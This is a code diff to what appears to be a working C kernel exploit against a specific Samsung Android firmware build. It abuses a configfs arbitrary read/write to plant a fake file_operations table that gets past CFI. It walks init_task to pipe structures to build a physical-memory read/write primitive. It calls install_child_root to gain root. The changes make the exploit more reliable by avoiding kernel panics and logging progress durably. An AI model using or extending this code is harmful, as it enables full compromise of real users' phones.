@@ -45,7 +45,8 @@ static int audit_fake_fops_table(int fd) {
                fake_fops, sizeof(table));
     return 0;
   }
-  ssize_t rd = configfs_read_once(fd, fake_fops, table, sizeof(table));
+  /* fake_fops is in a direct-map page, so read it through the guard. */
+  ssize_t rd = walk_read_kernel_bytes(fd, fake_fops, table, sizeof(table));
   if (rd != (ssize_t)sizeof(table)) {
     pr_warning("cfi fake fops read failed ret=%zd start=%016zx size=%zu errno=%d\n",
                rd, fake_fops, sizeof(table), errno);
@@ -89,9 +90,14 @@ static int audit_fake_fops_table(int fd) {
 
 static int fake_fops_owner_is_zero(int fd) {
   uint64_t owner = UINT64_MAX;
-  ssize_t rd = configfs_read_once(
-      fd, fake_fops + FOPS_OWNER_OFF, &owner, sizeof(owner));
+  /* fake_fops lives in a direct-map page. On F946BXXS7GZH2 a read of a direct-map
+   * address through the AAR panics the kernel (measured), so this read has to go
+   * through the same slab_cache_guard the walk uses. fops.c cannot see pipe.c's
+   * statics, so this calls the shared helper instead. */
+  ssize_t rd = walk_read_kernel_u64(fd, fake_fops + FOPS_OWNER_OFF, &owner);
   cfi_owner_ret = rd;
+  rmg_diag("CFI owner read ret=%zd value=%016llx errno=%d fakepp=%016zx\n", rd,
+           (unsigned long long)owner, errno, fake_fops);
   if (rd != (ssize_t)sizeof(owner) || owner != 0) {
     pr_warning("cfi fake fops owner mismatch ret=%zd value=%016llx errno=%d\n",
                rd, (unsigned long long)owner, errno);
@@ -272,8 +278,9 @@ int repair_fake_fops_llseek(int fd) {
     errno = ERANGE;
     return 0;
   }
-  ssize_t before_rd = configfs_read_once(
-      fd, slot, &before, sizeof(before));
+  /* `slot` is inside fake_fops, i.e. a direct-map address: read it guarded. The
+   * write can stay unguarded - writes to the direct map work. */
+  ssize_t before_rd = walk_read_kernel_u64(fd, slot, &before);
   if (before_rd != (ssize_t)sizeof(before)) {
     return 0;
   }
@@ -283,7 +290,7 @@ int repair_fake_fops_llseek(int fd) {
     return 1;
   }
   ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
-  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
+  ssize_t rd = walk_read_kernel_u64(fd, slot, &after);
   return wr == (ssize_t)sizeof(llseek) &&
          rd == (ssize_t)sizeof(after) &&
          after == llseek;
@@ -354,6 +361,8 @@ int try_cfi_stage(void) {
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
+  rmg_diag("CFI begin misc_fops=%016zx read=%016llx want=%016zx ret=%zd errno=%d\n",
+           misc_fops, (unsigned long long)pre_fops, fake_fops, pre_rb, errno);
   if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
     pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
                "read=%016llx want=%016zx errno=%d\n",
@@ -374,8 +383,8 @@ int try_cfi_stage(void) {
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
   unsigned char payload_before[sizeof(payload)];
   if (!one_page_span(binwrite_target, sizeof(payload)) ||
-      configfs_read_once(fd, binwrite_target, payload_before,
-                         sizeof(payload_before)) !=
+      walk_read_kernel_bytes(fd, binwrite_target, payload_before,
+                             sizeof(payload_before)) !=
           (ssize_t)sizeof(payload_before)) {
     cfi_last_step = 13;
     cfi_last_errno = errno;
@@ -396,6 +405,8 @@ int try_cfi_stage(void) {
   ssize_t n =
     configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
   cfi_write_ret = n;
+  rmg_diag("CFI scratch write ret=%zd errno=%d target=%016zx\n", n, errno,
+           binwrite_target);
   pr_info("cfi write ret=%zd errno=%d\n", n, errno);
   if (n != (ssize_t)sizeof(payload)) {
     cfi_last_step = 1;
@@ -405,18 +416,22 @@ int try_cfi_stage(void) {
   dirty = 1;
   cfi_dirty_seen = 1;
 
+  rmg_diag("CFI llseek repair begin slot=%016zx fake_fops=%016zx\n",
+           fake_fops + FOPS_LLSEEK_OFF, fake_fops);
   if (!repair_fake_fops_llseek(fd)) {
+    rmg_diag("CFI llseek repair FAILED errno=%d\n", errno);
     cfi_last_step = 2;
     cfi_last_errno = errno;
     goto fail;
   }
+  rmg_diag("CFI llseek repair OK\n");
   cfi_read_slot_ret = sizeof(uint64_t);
   can_read_back = 1;
 
   char readback[sizeof(payload)];
   memset(readback, 0, sizeof(readback));
-  ssize_t r =
-    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
+  ssize_t r = walk_read_kernel_bytes(fd, binwrite_target, readback,
+                                     sizeof(readback));
   cfi_read_ret = r;
   pr_info("cfi read ret=%zd errno=%d\n", r, errno);
   if (r != (ssize_t)sizeof(readback) ||
@@ -437,9 +452,16 @@ int try_cfi_stage(void) {
   uint64_t original_fops = canon_addr(ASHMEM_FOPS);
   pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
           misc_fops, (unsigned long long)original_fops);
+  /* rmg_diag (fsync'd to the durable log) rather than pr_info: the stage this
+   * runs in is the one that panics, and printk output is exactly what the panic
+   * truncates. The whole CFI sequence used to vanish, leaving only
+   * "fops-pre-pin-little" as the last line. */
+  rmg_diag("CFI restore begin misc_fops=%016zx value=%016llx fakepp=%016zx\n",
+           misc_fops, (unsigned long long)original_fops, fake_fops);
   ssize_t restore = configfs_write_once(
       fd, misc_fops, &original_fops, sizeof(original_fops));
   cfi_restore_ret = restore;
+  rmg_diag("CFI restore write ret=%zd errno=%d\n", restore, errno);
   if (restore != (ssize_t)sizeof(original_fops)) {
     cfi_last_step = 5;
     cfi_last_errno = errno;
@@ -449,6 +471,9 @@ int try_cfi_stage(void) {
   uint64_t before = 0;
   ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
   fops_before = before;
+  rmg_diag("CFI restore readback ret=%zd errno=%d got=%016llx want=%016llx\n", rb,
+           errno, (unsigned long long)before,
+           (unsigned long long)original_fops);
   if (rb != (ssize_t)sizeof(before) || before != original_fops) {
     cfi_last_step = 6;
     cfi_last_errno = errno;
@@ -484,6 +509,9 @@ int try_cfi_stage(void) {
 #endif
 
   pr_info("cfi starting pipe physrw\n");
+  rmg_diag("FOPS stage=pipe-physrw begin cfi_step=%d errno=%d\n", cfi_last_step,
+           cfi_last_errno);
+  fflush(NULL);
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (getenv("P0_ORACLE_DIAG")) {
@@ -497,13 +525,41 @@ int try_cfi_stage(void) {
 #ifndef PIPE_FIRST_LEAK_ATTEMPTS
 #define PIPE_FIRST_LEAK_ATTEMPTS 12
 #endif
+  /* With the deterministic walk enabled we do not need the order-3 grooming
+   * child at all: the victim comes from walking init_task -> files -> fdtable
+   * -> pipe_inode_info. That child (1216 clones + skb sendmsg + KernelSnitch)
+   * is also the stage that panics most often, so skipping it is the whole
+   * point. install_pipe_physrw() runs the walk and only grooms as a fallback. */
+  /* PIPE_DETERMINISTIC selects the structural walk.
+   *
+   * It is now the DEFAULT (1). The legacy groom+SLUB-scan path is what dies on
+   * F946BXXS7GZH2 - prepare_pipe_buffer_page() panics in almost every run, and
+   * the order-3 grooming child (1216 clones + skb sendmsg + KernelSnitch) is
+   * itself a major panic source. The walk needs no heap preparation at all, so
+   * skipping it removes both failure modes.
+   *
+   * The walk only performs 8-byte reads, which is the only read width that
+   * comes back intact through this AAR; the struct offsets it uses are taken
+   * from the BTF blob embedded in this firmware's own kernel Image rather than
+   * scanned for. Set PIPE_DETERMINISTIC=0 to force the legacy path back on for
+   * comparison. */
+  const char *det_env = getenv("PIPE_DETERMINISTIC");
+  int pipe_deterministic = (det_env && *det_env) ? atoi(det_env) : 1;
+  if (pipe_deterministic) {
+    rmg_diag("FOPS skipping order-3 grooming (deterministic walk enabled)\n");
+  } else {
   for (int first_leak_attempt = 0;
        first_leak_attempt < PIPE_FIRST_LEAK_ATTEMPTS;
        first_leak_attempt++) {
     if (first_leak_attempt != 0) {
       reset_pipe_attempt();
     }
+    rmg_diag("FOPS entering prepare_pipe_buffer_page n=%d\n",
+             first_leak_attempt + 1);
     pipebuf_page_base = prepare_pipe_buffer_page();
+    rmg_diag("FOPS prepare_pipe_buffer_page attempt=%d/%d base=%016zx\n",
+             first_leak_attempt + 1, PIPE_FIRST_LEAK_ATTEMPTS,
+             pipebuf_page_base);
     pr_info("fresh physrw pipe after verified fops page=%016zx "
             "attempt=%d/%d\n",
             pipebuf_page_base, first_leak_attempt + 1,
@@ -512,7 +568,8 @@ int try_cfi_stage(void) {
       break;
     }
   }
-  if (!is_direct_ptr(pipebuf_page_base)) {
+  }
+  if (!pipe_deterministic && !is_direct_ptr(pipebuf_page_base)) {
     cfi_last_step = 8;
     cfi_last_errno = errno;
     goto fail;
@@ -521,23 +578,37 @@ int try_cfi_stage(void) {
 
   int installed = 0;
   pipe_stage_attempts = 0;
+  rmg_diag("FOPS entering install_child_root loop max=%d\n", PIPE_MAX_ATTEMPTS);
   for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
     pipe_stage_attempts++;
     if (attempt != 0) {
       reset_pipe_attempt();
 #if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
-      pipebuf_page_base = prepare_pipe_buffer_page();
-      pr_info("fresh physrw retry page attempt=%d/%d base=%016zx\n",
-              attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
-      if (!is_direct_ptr(pipebuf_page_base)) {
-        continue;
+      /* Only re-groom when the deterministic walk is off; otherwise the retry
+       * should just walk again (cheap) rather than fork 1216 children. */
+      if (!pipe_deterministic) {
+        pipebuf_page_base = prepare_pipe_buffer_page();
+        rmg_diag("FOPS retry prepare attempt=%d/%d base=%016zx\n", attempt + 1,
+                 PIPE_MAX_ATTEMPTS, pipebuf_page_base);
+        pr_info("fresh physrw retry page attempt=%d/%d base=%016zx\n",
+                attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
+        if (!is_direct_ptr(pipebuf_page_base)) {
+          continue;
+        }
       }
 #endif
     }
+    rmg_diag("FOPS calling install_child_root attempt=%d page=%016zx\n",
+             attempt + 1, pipebuf_page_base);
     if (install_child_root(fd)) {
       installed = 1;
+      rmg_diag("FOPS install_child_root OK attempt=%d\n", attempt + 1);
       break;
     }
+    rmg_diag("FOPS install_child_root FAIL attempt=%d gate=%d rd=%d wr=%d "
+             "rd64=%d wr64=%d\n",
+             attempt + 1, pipe_cache_gate_ok, physrw_read_ok, physrw_write_ok,
+             physrw_read64_ok, physrw_write64_ok);
     if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
         physrw_read64_ok && physrw_write64_ok) {
       break;
